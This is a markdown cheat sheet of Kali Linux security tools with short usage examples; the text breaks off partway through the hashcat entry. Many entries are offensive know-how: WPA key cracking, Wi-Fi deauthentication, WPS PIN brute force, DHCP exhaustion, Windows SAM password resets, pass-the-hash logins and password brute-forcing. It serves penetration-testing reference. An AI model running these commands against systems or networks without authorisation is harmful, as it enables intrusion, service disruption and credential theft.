# Linux Command 101
# Security | Kali Tools

## Table of Contents

<!-- vscode-markdown-toc -->
1. [Kali Tools](#KaliTools)
   1.1. [aircrack-ng:   Crack WEP and WPA/WPA2 keys from handshake in captured packets.](#aircrack-ng:CrackWEPandWPAWPA2keysfromhandshakeincapturedpackets.)
   1.2. [airdecap-ng:   Decrypt a WEP, WPA, or WPA2 encrypted capture file.](#airdecap-ng:DecryptaWEPWPAorWPA2encryptedcapturefile.)
   1.3. [aireplay-ng:   Inject packets into a wireless network.](#aireplay-ng:Injectpacketsintoawirelessnetwork.)
   1.4. [airmon-ng:   Activate monitor mode on wireless network devices.](#airmon-ng:Activatemonitormodeonwirelessnetworkdevices.)
   1.5. [airodump-ng:   Capture packets and display information about wireless networks.](#airodump-ng:Capturepacketsanddisplayinformationaboutwirelessnetworks.)
   1.6. [amass:   In-depth Attack Surface Mapping and Asset Discovery tool.](#amass:In-depthAttackSurfaceMappingandAssetDiscoverytool.)
   1.7. [apktool:   Reverse engineer APK files.](#apktool:ReverseengineerAPKfiles.)
   1.8. [arping:   Discover and probe hosts in a network using the ARP protocol.](#arping:DiscoverandprobehostsinanetworkusingtheARPprotocol.)
   1.9. [binwalk:   Firmware Analysis Tool.](#binwalk:FirmwareAnalysisTool.)
   1.10. [braa:   Ultra-fast mass SNMP scanner allowing multiple hosts simultaneously.](#braa:Ultra-fastmassSNMPscannerallowingmultiplehostssimultaneously.)
   1.11. [bully:   Brute-force the WPS pin of a wireless access point.](#bully:Brute-forcetheWPSpinofawirelessaccesspoint.)
   1.12. [cadaver:   WebDAV client for Unix.](#cadaver:WebDAVclientforUnix.)
   1.13. [cewl:   URL spidering tool for making a cracking wordlist from web content.](#cewl:URLspideringtoolformakingacrackingwordlistfromwebcontent.)
   1.14. [chntpw:   A utility that can edit windows registry, reset user password, promote users to administrator by modifying the Windows SAM.](#chntpw:AutilitythatcaneditwindowsregistryresetuserpasswordpromoteuserstoadministratorbymodifyingtheWindowsSAM.)
   1.15. [clang:   Compiler for C, C++, and Objective-C source files. Can be used as a drop-in replacement for GCC.](#clang:CompilerforCCandObjective-Csourcefiles.Canbeusedasadrop-inreplacementforGCC.)
   1.16. [clang++:   Compile C++ source files.](#clang:CompileCsourcefiles.)
   1.17. [crunch:   Wordlist generator.](#crunch:Wordlistgenerator.)
   1.18. [dcfldd:   Enhanced version of dd for forensics and security.](#dcfldd:Enhancedversionofddforforensicsandsecurity.)
   1.19. [ddrescue:   Data recovery tool that reads data from damaged block devices.](#ddrescue:Datarecoverytoolthatreadsdatafromdamagedblockdevices.)
   1.20. [dhcpig:   Initiates an advanced DHCP exhaustion attack and stress test.](#dhcpig:InitiatesanadvancedDHCPexhaustionattackandstresstest.)
   1.21. [dirb:   Scan HTTP-based webservers for directories and files.](#dirb:ScanHTTP-basedwebserversfordirectoriesandfiles.)
   1.22. [dirbuster:   Brute force directories and filenames on servers.](#dirbuster:Bruteforcedirectoriesandfilenamesonservers.)
   1.23. [dnsmap:   The dnsmap command scans a domain for common subdomains e.g. smtp.domain.org.](#dnsmap:Thednsmapcommandscansadomainforcommonsubdomainse.g.smtp.domain.org.)
   1.24. [dnsrecon:   DNS enumeration tool.](#dnsrecon:DNSenumerationtool.)
   1.25. [dnstracer:   The dnstracer command determines where a DNS gets its information from.](#dnstracer:ThednstracercommanddetermineswhereaDNSgetsitsinformationfrom.)
   1.26. [enum4linux:   Enumerate Windows and Samba information from remote systems.](#enum4linux:EnumerateWindowsandSambainformationfromremotesystems.)
   1.27. [evil-winrm:   Windows Remote Management (WinRM) shell for pentesting.](#evil-winrm:WindowsRemoteManagementWinRMshellforpentesting.)
   1.28. [extundelete:   Recover deleted files from ext3 or ext4 partitions by parsing the journal.](#extundelete:Recoverdeletedfilesfromext3orext4partitionsbyparsingthejournal.)
   1.29. [fcrackzip:   ZIP archive password cracking utility.](#fcrackzip:ZIParchivepasswordcrackingutility.)
   1.30. [ffuf:   A fast web fuzzer written in Go.](#ffuf:AfastwebfuzzerwritteninGo.)
   1.31. [fls:   List files and directories in an image file or device.](#fls:Listfilesanddirectoriesinanimagefileordevice.)
   1.32. [fping:   A more powerful ping which can ping multiple hosts.](#fping:Amorepowerfulpingwhichcanpingmultiplehosts.)
   1.33. [gobuster:   Brute-forces hidden paths on web servers and more.](#gobuster:Brute-forceshiddenpathsonwebserversandmore.)
   1.34. [hashcat:   Fast and advanced password recovery tool.](#hashcat:Fastandadvancedpasswordrecoverytool.)
   1.35. [hashid:   Python3 program that identifies data and password hashes.](#hashid:Python3programthatidentifiesdataandpasswordhashes.)
   1.36. [hping3:   Advanced ping utility which supports protocols such TCP, UDP, and raw IP.](#hping3:AdvancedpingutilitywhichsupportsprotocolssuchTCPUDPandrawIP.)
   1.37. [hydra:   Online password guessing tool.](#hydra:Onlinepasswordguessingtool.)
   1.38. [john:   Password cracker.](#john:Passwordcracker.)
   1.39. [kismet:   A wireless network and device detector, sniffer, wardriving tool, and WIDS (wireless intrusion detection) framework.](#kismet:AwirelessnetworkanddevicedetectorsnifferwardrivingtoolandWIDSwirelessintrusiondetectionframework.)
   1.40. [lynis:   System and security auditing tool.](#lynis:Systemandsecurityauditingtool.)
   1.41. [macchanger:   Command-line utility for manipulating network interface MAC addresses.](#macchanger:Command-lineutilityformanipulatingnetworkinterfaceMACaddresses.)
   1.42. [masscan:   Network scanner for scanning as fast as possible.](#masscan:Networkscannerforscanningasfastaspossible.)
   1.43. [medusa:   A modular and parallel login brute-forcer for a variety of protocols.](#medusa:Amodularandparallelloginbrute-forcerforavarietyofprotocols.)
   1.44. [minicom:   Communicate with the serial interface of a device.](#minicom:Communicatewiththeserialinterfaceofadevice.)
   1.45. [mitmproxy:   An interactive man-in-the-middle HTTP proxy.](#mitmproxy:Aninteractiveman-in-the-middleHTTPproxy.)
   1.46. [mmls:   Display the partition layout of a volume system.](#mmls:Displaythepartitionlayoutofavolumesystem.)
   1.47. [msfvenom:   Manually generate payloads for metasploit.](#msfvenom:Manuallygeneratepayloadsformetasploit.)
   1.48. [nasm:   The Netwide Assembler, a portable 80x86 assembler.](#nasm:TheNetwideAssembleraportable80x86assembler.)
   1.49. [nbtscan:   Scan networks for NetBIOS name information.](#nbtscan:ScannetworksforNetBIOSnameinformation.)
   1.50. [netcat:   This command is an alias of nc.](#netcat:Thiscommandisanaliasofnc.)
   1.51. [nikto:   Web server scanner which performs tests against web servers for multiple items.](#nikto:Webserverscannerwhichperformstestsagainstwebserversformultipleitems.)
   1.52. [nmap:   Network exploration tool and security/port scanner.](#nmap:Networkexplorationtoolandsecurityportscanner.)
   1.53. [pdf-parser:   Identify fundamental elements of a PDF file without rendering it.](#pdf-parser:IdentifyfundamentalelementsofaPDFfilewithoutrenderingit.)
   1.54. [radare2:   A set of reverse engineering tools.](#radare2:Asetofreverseengineeringtools.)
   1.55. [rarcrack:   Password cracker for RAR, Zip and 7z archives.](#rarcrack:PasswordcrackerforRARZipand7zarchives.)
   1.56. [searchsploit:   Search Exploit Database for exploits, shellcodes and/or papers.](#searchsploit:SearchExploitDatabaseforexploitsshellcodesandorpapers.)
   1.57. [sherlock:   Find usernames across social networks.](#sherlock:Findusernamesacrosssocialnetworks.)
   1.58. [siege:   HTTP loadtesting and benchmarking tool.](#siege:HTTPloadtestingandbenchmarkingtool.)
   1.59. [smbmap:   SMB enumeration tool.](#smbmap:SMBenumerationtool.)
   1.60. [socat:   Multipurpose relay (SOcket CAT).](#socat:MultipurposerelaySOcketCAT.)
   1.61. [sqlmap:   Detect and exploit SQL injection flaws.](#sqlmap:DetectandexploitSQLinjectionflaws.)
   1.62. [sslscan:   Check SSL/TLS protocols and ciphers supported by a server.](#sslscan:CheckSSLTLSprotocolsandcipherssupportedbyaserver.)
   1.63. [swaks:   Swiss Army Knife SMTP, the all-purpose SMTP transaction tester.](#swaks:SwissArmyKnifeSMTPtheall-purposeSMTPtransactiontester.)
   1.64. [tcpdump:   Dump traffic on a network.](#tcpdump:Dumptrafficonanetwork.)
   1.65. [tcpflow:   Capture TCP traffic for debugging and analysis.](#tcpflow:CaptureTCPtrafficfordebuggingandanalysis.)
   1.66. [theharvester:   A tool designed to be used in the early stages of a penetration test.](#theharvester:Atooldesignedtobeusedintheearlystagesofapenetrationtest.)
   1.67. [wfuzz:   A web application bruteforcer.](#wfuzz:Awebapplicationbruteforcer.)
   1.68. [wpscan:   WordPress vulnerability scanner.](#wpscan:WordPressvulnerabilityscanner.)
   1.69. [zip2john:   Extract password hashes from Zip archives for use with John the Ripper password cracker.](#zip2john:ExtractpasswordhashesfromZiparchivesforusewithJohntheRipperpasswordcracker.)
   1.70. [zip2john:   Extract password hashes from Zip archives for use with John the Ripper password cracker.](#zip2john:ExtractpasswordhashesfromZiparchivesforusewithJohntheRipperpasswordcracker.-1)

<!-- vscode-markdown-toc-config
	numbering=true
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

---

##  1. <a name='KaliTools'></a>Kali Tools

#### aircrack-ng:   Crack WEP and WPA/WPA2 keys from handshake in captured packets.
```sh
aircrack-ng

  Crack WEP and WPA/WPA2 keys from handshake in captured packets.
  Part of Aircrack-ng network software suite.
  More information: https://www.aircrack-ng.org/doku.php?id=aircrack-ng.

  - Crack key from capture file using [w]ordlist:
    aircrack-ng -w path/to/wordlist.txt path/to/capture.cap

  - Crack key from capture file using [w]ordlist and the access point's [e]ssid:
    aircrack-ng -w path/to/wordlist.txt -e essid path/to/capture.cap

  - Crack key from capture file using [w]ordlist and the access point's MAC address:
    aircrack-ng -w path/to/wordlist.txt --bssid mac path/to/capture.cap
```

---

#### airdecap-ng:   Decrypt a WEP, WPA, or WPA2 encrypted capture file.
```sh
airdecap-ng

  Decrypt a WEP, WPA, or WPA2 encrypted capture file.
  Part of Aircrack-ng network software suite.
  More information: https://www.aircrack-ng.org/doku.php?id=airdecap-ng.

  - Remove wireless headers from an open network capture file and use the access point's MAC address to filter:
    airdecap-ng -b ap_mac path/to/capture.cap

  - Decrypt a [w]EP encrypted capture file using the key in hex format:
    airdecap-ng -w hex_key path/to/capture.cap

  - Decrypt a WPA/WPA2 encrypted capture file using the access point's [e]ssid and [p]assword:
    airdecap-ng -e essid -p password path/to/capture.cap

  - Decrypt a WPA/WPA2 encrypted capture file preserving the headers using the access point's [e]ssid and [p]assword:
    airdecap-ng -l -e essid -p password path/to/capture.cap

  - Decrypt a WPA/WPA2 encrypted capture file using the access point's [e]ssid and [p]assword and use its MAC address to filter:
    airdecap-ng -b ap_mac -e essid -p password path/to/capture.cap
```

---

#### aireplay-ng:   Inject packets into a wireless network.
```sh
aireplay-ng

  Inject packets into a wireless network.
  Part of aircrack-ng.
  More information: https://www.aircrack-ng.org/doku.php?id=aireplay-ng.

  - Send a specific number of disassociate packets given an access point's MAC address, a client's MAC address and an interface:
    sudo aireplay-ng --deauth count --bssid ap_mac --dmac client_mac interface


See also: aircrack-ng
```

---

#### airmon-ng:   Activate monitor mode on wireless network devices.
```sh
airmon-ng

  Activate monitor mode on wireless network devices.
  Part of aircrack-ng.
  More information: https://www.aircrack-ng.org/doku.php?id=airmon-ng.

  - List wireless devices and their statuses:
    sudo airmon-ng

  - Turn on monitor mode for a specific device:
    sudo airmon-ng start wlan0

  - Kill disturbing processes that use wireless devices:
    sudo airmon-ng check kill

  - Turn off monitor mode for a specific network interface:
    sudo airmon-ng stop wlan0mon


See also: aircrack-ng
```

---

#### airodump-ng:   Capture packets and display information about wireless networks.
```sh
airodump-ng

  Capture packets and display information about wireless networks.
  Part of aircrack-ng.
  More information: https://www.aircrack-ng.org/doku.php?id=airodump-ng.

  - Capture packets and display information about wireless network(s) on the 2.4GHz band:
    sudo airodump-ng interface

  - Capture packets and display information about wireless network(s) on the 5GHz band:
    sudo airodump-ng interface --band a

  - Capture packets and display information about wireless network(s) on both 2.4GHz and 5GHz bands:
    sudo airodump-ng interface --band abg

  - Capture packets and display information about a wireless network given the MAC address and channel, and save the output to a file:
    sudo airodump-ng --channel channel --write path/to/file --bssid mac interface


See also: aircrack-ng
```

---

#### amass:   In-depth Attack Surface Mapping and Asset Discovery tool.
```sh
amass

  In-depth Attack Surface Mapping and Asset Discovery tool.
  Some subcommands such as amass intel have their own usage documentation.
  More information: https://github.com/owasp-amass/amass.

  - Execute an Amass subcommand:
    amass intel|enum options

  - Display help:
    amass -help

  - Display help on an Amass subcommand:
    amass intel|enum -help

  - Display version:
    amass -version
```

---

#### apktool:   Reverse engineer APK files.
```sh
apktool

  Reverse engineer APK files.
  More information: https://ibotpeaches.github.io/Apktool/.

  - Decode an APK file:
    apktool d path/to/file.apk

  - Build an APK file from a directory:
    apktool b path/to/directory

  - Install and store a framework:
    apktool if path/to/framework.apk
```

---

#### arping:   Discover and probe hosts in a network using the ARP protocol.
```sh
arping

  Discover and probe hosts in a network using the ARP protocol.
  Useful for MAC address discovery.
  More information: https://github.com/ThomasHabets/arping.

  - Ping a host by ARP request packets:
    arping host_ip

  - Ping a host on a specific interface:
    arping -I interface host_ip

  - Ping a host and [f]inish after the first reply:
    arping -f host_ip

  - Ping a host a specific number ([c]ount) of times:
    arping -c count host_ip

  - Broadcast ARP request packets to update neighbours' ARP caches ([U]nsolicited ARP mode):
    arping -U ip_to_broadcast

  - [D]etect duplicated IP addresses in the network by sending ARP requests with a 3 second timeout:
    arping -D -w 3 ip_to_check
```

---

#### binwalk:   Firmware Analysis Tool.
```sh
binwalk

  Firmware Analysis Tool.
  More information: https://github.com/ReFirmLabs/binwalk.

  - Scan a binary file:
    binwalk path/to/binary

  - Extract files from a binary, specifying the output directory:
    binwalk --extract --directory output_directory path/to/binary

  - Recursively extract files from a binary limiting the recursion depth to 2:
    binwalk --extract --matryoshka --depth 2 path/to/binary

  - Extract files from a binary with the specified file signature:
    binwalk --dd 'png image:png' path/to/binary

  - Analyze the entropy of a binary, saving the plot with the same name as the binary and .png extension appended:
    binwalk --entropy --save path/to/binary

  - Combine entropy, signature and opcodes analysis in a single command:
    binwalk --entropy --signature --opcodes path/to/binary
```

---

#### braa:   Ultra-fast mass SNMP scanner allowing multiple hosts simultaneously.
```sh
braa

  Ultra-fast mass SNMP scanner allowing multiple hosts simultaneously.
  More information: https://github.com/mteg/braa.

  - Walk the SNMP tree of host with public string querying all OIDs under .1.3.6:
    braa public@ip:.1.3.6.*

  - Query the whole subnet ip_range for system.sysLocation.0:
    braa public@ip_range:.1.3.6.1.2.1.1.6.0

  - Attempt to set the value of system.sysLocation.0 to a specific workgroup:
    braa private@ip:.1.3.6.1.2.1.1.6.0=s'workgroup'
```

---

#### bully:   Brute-force the WPS pin of a wireless access point.
```sh
bully

  Brute-force the WPS pin of a wireless access point.
  Necessary information must be gathered with airmon-ng and airodump-ng before using bully.
  More information: https://salsa.debian.org/pkg-security-team/bully.

  - Crack the password:
    bully --bssid "mac" --channel "channel" --bruteforce "interface"

  - Display help:
    bully --help


See also: airmon-ng, airodump-ng
```

---

#### cadaver:   WebDAV client for Unix.
```sh
cadaver

  WebDAV client for Unix.
  More information: https://manned.org/cadaver.

  - Connect to the server <dav.example.com>, open the root collection:
    cadaver http://dav.example.com/

  - Connect to a server using a specific port and open the collection /foo/bar/:
    cadaver http://dav.example.com:8022/foo/bar/

  - Connect to a server using SSL:
    cadaver https://davs.example.com/
```

---

#### cewl:   URL spidering tool for making a cracking wordlist from web content.
```sh
cewl

  URL spidering tool for making a cracking wordlist from web content.
  More information: https://digi.ninja/projects/cewl.php.

  - Create a wordlist file from the given URL up to 2 links depth:
    cewl --depth 2 --write path/to/wordlist.txt url

  - Output an alphanumeric wordlist from the given URL with words of minimum 5 characters:
    cewl --with-numbers --min_word_length 5 url

  - Output a wordlist from the given URL in debug mode including email addresses:
    cewl --debug --email url

  - Output a wordlist from the given URL using HTTP Basic or Digest authentication:
    cewl --auth_type basic|digest --auth_user username --auth_pass password url

  - Output a wordlist from the given URL through a proxy:
    cewl --proxy_host host --proxy_port port url
```

---

#### chntpw:   A utility that can edit windows registry, reset user password, promote users to administrator by modifying the Windows SAM.
```sh
chntpw

  A utility that can edit windows registry, reset user password, promote users to administrator by modifying the Windows SAM.
  Boot target machine with live cd like Kali Linux and run with elevated privileges.
  More information: http://pogostick.net/~pnh/ntpasswd.

  - List all users in the SAM file:
    chntpw -l path/to/sam_file

  - Edit [u]ser interactively:
    chntpw -u username path/to/sam_file

  - Use chntpw [i]nteractively:
    chntpw -i path/to/sam_file
```

---

#### clang:   Compiler for C, C++, and Objective-C source files. Can be used as a drop-in replacement for GCC.
```sh
clang

  Compiler for C, C++, and Objective-C source files. Can be used as a drop-in replacement for GCC.
  More information: https://clang.llvm.org/docs/ClangCommandLineReference.html.

  - Compile a source code file into an executable binary:
    clang input_source.c -o output_executable

  - Activate output of all errors and warnings:
    clang input_source.c -Wall -o output_executable

  - Include libraries located at a different path than the source file:
    clang input_source.c -o output_executable -Iheader_path -Llibrary_path -llibrary_name

  - Compile source code into LLVM Intermediate Representation (IR):
    clang -S -emit-llvm file.c -o file.ll

  - Compile source code without linking:
    clang -c input_source.c

  - Optimize the compiled program for performance:
    clang path/to/source.c -O1|2|3|fast
```

---

#### clang++:   Compile C++ source files.
```sh
clang++

  Compile C++ source files.
  Part of LLVM.
  More information: https://clang.llvm.org.

  - Compile a source code file into an executable binary:
    clang++ path/to/source.cpp -o path/to/output_executable

  - Display (almost) all errors and warnings:
    clang++ path/to/source.cpp -Wall -o path/to/output_executable

  - Choose a language standard to compile with:
    clang++ path/to/source.cpp -std=c++20 -o path/to/output_executable

  - Include libraries located at a different path than the source file:
    clang++ path/to/source.cpp -o path/to/output_executable -Ipath/to/header_path -Lpath/to/library_path -lpath/to/library_name

  - Compile source code into LLVM Intermediate Representation (IR):
    clang++ -S -emit-llvm path/to/source.cpp -o path/to/output.ll

  - Optimize the compiled program for performance:
    clang++ path/to/source.cpp -O1|2|3|fast -o path/to/output_executable
```

---

#### crunch:   Wordlist generator.
```sh
crunch

  Wordlist generator.
  More information: https://sourceforge.net/projects/crunch-wordlist/.

  - Output a list of words of length 1 to 3 with only lowercase characters:
    crunch 1 3

  - Output a list of hexadecimal words of length 8:
    crunch 8 8 0123456789abcdef

  - Output a list of all permutations of abc (lengths are not processed):
    crunch 1 1 -p abc

  - Output a list of all permutations of the given strings (lengths are not processed):
    crunch 1 1 -p abc def ghi

  - Output a list of words generated according to the given pattern and a maximum number of duplicate letters:
    crunch 5 5 abcde123 -t @@@12 -d 2@

  - Write a list of words in chunk files of a given size, starting with the given string:
    crunch 3 5 -o START -b 10kb -s abc

  - Write a list of words stopping with the given string and inverting the wordlist:
    crunch 1 5 -o START -e abcde -i

  - Write a list of words in compressed chunk files with a specified number of words:
    crunch 1 5 -o START -c 1000 -z gzip|bzip2|lzma|7z
```

---

#### dcfldd:   Enhanced version of dd for forensics and security.
```sh
dcfldd

  Enhanced version of dd for forensics and security.
  More information: http://dcfldd.sourceforge.net/.

  - Copy a disk to a raw image file and hash the image using SHA256:
    dcfldd if=/dev/disk_device of=file.img hash=sha256 hashlog=file.hash

  - Copy a disk to a raw image file, hashing each 1 GB chunk:
    dcfldd if=/dev/disk_device of=file.img hash=sha512|sha384|sha256|sha1|md5 hashlog=file.hash hashwindow=1G
```

---

#### ddrescue:   Data recovery tool that reads data from damaged block devices.
```sh
ddrescue

  Data recovery tool that reads data from damaged block devices.
  More information: https://www.gnu.org/software/ddrescue/.

  - Take an image of a device, creating a log file:
    sudo ddrescue /dev/sdb path/to/image.dd path/to/log.txt

  - Clone Disk A to Disk B, creating a log file:
    sudo ddrescue --force --no-scrape /dev/sdX /dev/sdY path/to/log.txt
```

---

#### dhcpig:   Initiates an advanced DHCP exhaustion attack and stress test.
```sh
dhcpig

  Initiates an advanced DHCP exhaustion attack and stress test.
  DHCPig needs to be run with root privileges.
  More information: https://github.com/kamorin/DHCPig.

  - Exhaust all of the available DHCP addresses using the specified interface:
    sudo ./pig.py eth0

  - Exhaust IPv6 addresses using eth1 interface:
    sudo ./pig.py -6 eth1

  - Send fuzzed/malformed data packets using the interface:
    sudo ./pig.py --fuzz eth1

  - Enable color output:
    sudo ./pig.py -c eth1

  - Enable minimal verbosity and color output:
    sudo ./pig.py -c --verbosity=1 eth1

  - Use a debug verbosity of 100 and scan network of neighboring devices using ARP packets:
    sudo ./pig.py -c --verbosity=100 --neighbors-scan-arp eth1

  - Enable printing lease information, attempt to scan and release all neighbor IP addresses:
    sudo ./pig.py --neighbors-scan-arp -r --show-options eth1
```

---

#### dirb:   Scan HTTP-based webservers for directories and files.
```sh
dirb

  Scan HTTP-based webservers for directories and files.
  More information: http://dirb.sourceforge.net.

  - Scan a webserver using the default wordlist:
    dirb https://example.org

  - Scan a webserver using a custom wordlist:
    dirb https://example.org path/to/wordlist.txt

  - Scan a webserver non-recursively:
    dirb https://example.org -r

  - Scan a webserver using a specified user-agent and cookie for HTTP-requests:
    dirb https://example.org -a user_agent_string -c cookie_string
```

---

#### dirbuster:   Brute force directories and filenames on servers.
```sh
dirbuster

  Brute force directories and filenames on servers.
  More information: https://www.kali.org/tools/dirbuster/.

  - Start in GUI mode:
    dirbuster -u http://example.com

  - Start in headless (no GUI) mode:
    dirbuster -H -u http://example.com

  - Set the file extension list:
    dirbuster -e txt,html

  - Enable verbose output:
    dirbuster -v

  - Set the report location:
    dirbuster -r path/to/report.txt
```

---

#### dnsmap:   The dnsmap command scans a domain for common subdomains e.g. smtp.domain.org.
```sh
dnsmap

  The dnsmap command scans a domain for common subdomains e.g. smtp.domain.org.
  More information: https://github.com/resurrecting-open-source-projects/dnsmap.

  - Scan for subdomains using the internal wordlist:
    dnsmap example.com

  - Specify a list of subdomains to check for:
    dnsmap example.com -w path/to/wordlist.txt

  - Store results to a CSV file:
    dnsmap example.com -c path/to/file.csv

  - Ignore 2 IPs that are false positives (up to 5 possible):
    dnsmap example.com -i 123.45.67.89,98.76.54.32
```

---

#### dnsrecon:   DNS enumeration tool.
```sh
dnsrecon

  DNS enumeration tool.
  More information: https://github.com/darkoperator/dnsrecon.

  - Scan a domain and save the results to an SQLite database:
    dnsrecon --domain example.com --db path/to/database.sqlite

  - Scan a domain, specifying the nameserver and performing a zone transfer:
    dnsrecon --domain example.com --name_server nameserver.example.com --type axfr

  - Scan a domain, using a brute-force attack and a dictionary of subdomains and hostnames:
    dnsrecon --domain example.com --dictionary path/to/dictionary.txt --type brt

  - Scan a domain, performing a reverse lookup of IP ranges from the SPF record and saving the results to a JSON file:
    dnsrecon --domain example.com -s --json

  - Scan a domain, performing a Google enumeration and saving the results to a CSV file:
    dnsrecon --domain example.com -g --csv

  - Scan a domain, performing DNS cache snooping:
    dnsrecon --domain example.com --type snoop --name_server nameserver.example.com --dictionary path/to/dictionary.txt

  - Scan a domain, performing zone walking:
    dnsrecon --domain example.com --type zonewalk
```

---

#### dnstracer:   The dnstracer command determines where a DNS gets its information from.
```sh
dnstracer

  The dnstracer command determines where a DNS gets its information from.
  More information: https://manned.org/dnstracer.

  - Find out where your local DNS got the information on http://www.example.com:
    dnstracer www.example.com

  - Start with a [s]pecific DNS that you already know:
    dnstracer -s dns.example.org www.example.com

  - Only query IPv4 servers:
    dnstracer -4 www.example.com

  - Retry each request 5 times on failure:
    dnstracer -r 5 www.example.com

  - Display all steps during execution:
    dnstracer -v www.example.com

  - Display an [o]verview of all received answers after execution:
    dnstracer -o www.example.com
```

---

#### enum4linux:   Enumerate Windows and Samba information from remote systems.
```sh
enum4linux

  Enumerate Windows and Samba information from remote systems.
  More information: https://labs.portcullis.co.uk/tools/enum4linux/.

  - Try to enumerate using all methods:
    enum4linux -a remote_host

  - Enumerate using given login credentials:
    enum4linux -u user_name -p password remote_host

  - List usernames from a given host:
    enum4linux -U remote_host

  - List shares:
    enum4linux -S remote_host

  - Get OS information:
    enum4linux -o remote_host
```

---

#### evil-winrm:   Windows Remote Management (WinRM) shell for pentesting.
```sh
evil-winrm

  Windows Remote Management (WinRM) shell for pentesting.
  Once connected, we get a PowerShell prompt on the target host.
  More information: https://github.com/Hackplayers/evil-winrm.

  - Connect to a host:
    evil-winrm --ip ip --user user --password password

  - Connect to a host, passing the password hash:
    evil-winrm --ip ip --user user --hash nt_hash

  - Connect to a host, specifying directories for scripts and executables:
    evil-winrm --ip ip --user user --password password --scripts path/to/scripts --executables path/to/executables

  - Connect to a host, using SSL:
    evil-winrm --ip ip --user user --password password --ssl --pub-key path/to/pubkey --priv-key path/to/privkey

  - Upload a file to the host:
    PS > upload path/to/local/file path/to/remote/file

  - List all loaded PowerShell functions:
    PS > menu

  - Load a PowerShell script from the --scripts directory:
    PS > script.ps1

  - Invoke a binary on the host from the --executables directory:
    PS > Invoke-Binary binary.exe
```

---

#### extundelete:   Recover deleted files from ext3 or ext4 partitions by parsing the journal.
```sh
extundelete

  Recover deleted files from ext3 or ext4 partitions by parsing the journal.
  See also date for Unix time information and umount for unmounting partitions.
  More information: http://extundelete.sourceforge.net.

  - Restore all deleted files inside partition N on device X:
    sudo extundelete /dev/sdXN --restore-all

  - Restore a file from a path relative to root (Do not start the path with /):
    extundelete /dev/sdXN --restore-file path/to/file

  - Restore a directory from a path relative to root (Do not start the path with /):
    extundelete /dev/sdXN --restore-directory path/to/directory

  - Restore all files deleted after January 1st, 2020 (in Unix time):
    extundelete /dev/sdXN --restore-all --after 1577840400


See also: date, umount
```

---

#### fcrackzip:   ZIP archive password cracking utility.
```sh
fcrackzip

  ZIP archive password cracking utility.
  More information: https://manned.org/fcrackzip.

  - Brute-force a password with a length of 4 to 8 characters, and contains only alphanumeric characters (order matters):
    fcrackzip --brute-force --length 4-8 --charset aA1 archive

  - Brute-force a password in verbose mode with a length of 3 characters that only contains lowercase characters, $ and %:
    fcrackzip -v --brute-force --length 3 --charset a:$% archive

  - Brute-force a password that contains only lowercase and special characters:
    fcrackzip --brute-force --length 4 --charset a! archive

  - Brute-force a password containing only digits, starting from the password 12345:
    fcrackzip --brute-force --length 5 --charset 1 --init-password 12345 archive

  - Crack a password using a wordlist:
    fcrackzip --use-unzip --dictionary --init-password wordlist archive

  - Benchmark cracking performance:
    fcrackzip --benchmark
```

---

#### ffuf:   A fast web fuzzer written in Go.
```sh
ffuf

  A fast web fuzzer written in Go.
  The FUZZ keyword is used as a placeholder. ffuf will try to hit the URL by replacing the word FUZZ with every word in the wordlist.
  More information: https://github.com/ffuf/ffuf#usage.

  - Enumerate directories using [c]olored output and a [w]ordlist specifying a target [u]RL:
    ffuf -c -w path/to/wordlist.txt -u http://target/FUZZ

  - Enumerate webservers of subdomains by changing the position of the keyword:
    ffuf -w path/to/subdomains.txt -u http://FUZZ.target.com

  - Fuzz with specified [t]hreads (default: 40) and pro[x]ying the traffic and save [o]utput to a file:
    ffuf -o -w path/to/wordlist.txt -u http://target/FUZZ -t 500 -x http://127.0.0.1:8080

  - Fuzz a specific [H]eader ("Name: Value") and [m]atch HTTP status [c]odes:
    ffuf -w path/to/wordlist.txt -u http://target.com -H "Host: FUZZ" -mc 200

  - Fuzz with specified HTTP method and [d]ata, while [f]iltering out comma separated status [c]odes:
    ffuf -w path/to/postdata.txt -X POST -d "username=admin\&password=FUZZ" -u http://target/login.php -fc 401,403

  - Fuzz multiple positions with multiple wordlists using different modes:
    ffuf -w path/to/keys:KEY -w path/to/values:VALUE -mode pitchfork|clusterbomb -u http://target.com/id?KEY=VALUE

  - Proxy requests through a HTTP MITM pro[x]y (such as Burp Suite or mitmproxy):
    ffuf -w path/to/wordlist -x http://127.0.0.1:8080 -u http://target.com/FUZZ


See also: mitmproxy
```

---

#### fls:   List files and directories in an image file or device.
```sh
fls

  List files and directories in an image file or device.
  More information: https://wiki.sleuthkit.org/index.php?title=Fls.

  - Build a recursive fls list over a device, output paths will start with C:
    fls -r -m C: /dev/loop1p1

  - Analyze a single partition, providing the sector offset at which the filesystem starts in the image:
    fls -r -m C: -o sector path/to/image_file

  - Analyze a single partition, providing the timezone of the original system:
    fls -r -m C: -z timezone /dev/loop1p1
```

---

#### fping:   A more powerful ping which can ping multiple hosts.
```sh
fping

  A more powerful ping which can ping multiple hosts.
  More information: https://fping.org.

  - List alive hosts within a subnet generated from a netmask:
    fping -a -g 192.168.1.0/24

  - List alive hosts within a subnet generated from an IP range:
    fping -a -g 192.168.1.1 192.168.1.254

  - List unreachable hosts within a subnet generated from a netmask:
    fping -u -g 192.168.1.0/24
```

---

#### gobuster:   Brute-forces hidden paths on web servers and more.
```sh
gobuster

  Brute-forces hidden paths on web servers and more.
  More information: https://github.com/OJ/gobuster.

  - Discover directories and files that match in the wordlist:
    gobuster dir --url https://example.com/ --wordlist path/to/file

  - Discover subdomains:
    gobuster dns --domain example.com --wordlist path/to/file

  - Discover Amazon S3 buckets:
    gobuster s3 --wordlist path/to/file

  - Discover other virtual hosts on the server:
    gobuster vhost --url https://example.com/ --wordlist path/to/file

  - Fuzz the value of a parameter:
    gobuster fuzz --url https://example.com/?parameter=FUZZ --wordlist path/to/file

  - Fuzz the name of a parameter:
    gobuster fuzz --url https://example.com/?FUZZ=value --wordlist path/to/file
```

---

#### hashcat:   Fast and advanced password recovery tool.
```sh
hashcat

  Fast and advanced password recovery tool.
  More information: https://hashcat.net/wiki/doku.php?id=hashcat.

  - Perform a brute-force attack (mode 3) with the default hashcat mask:
    hashcat --hash-type hash_type_id --attack-mode 3 hash_value

  - Perform a brute-force attack (mode 3) with a known pattern of 4 digits:
    hashcat --hash-type hash_type_id --attack-mode 3 hash_value "?d?d?d?d"

  - Perform a brute-force attack (mode 3) using at most 8 of all printable ASCII characters:
    hashcat --hash-type hash_type_id --attack-mode 3 --increment hash_value "?a?a?a?a?a?a?a?a"

  - Perform a dictionary attack (mode 0) using the RockYou wordlist of a Kali Linux box:
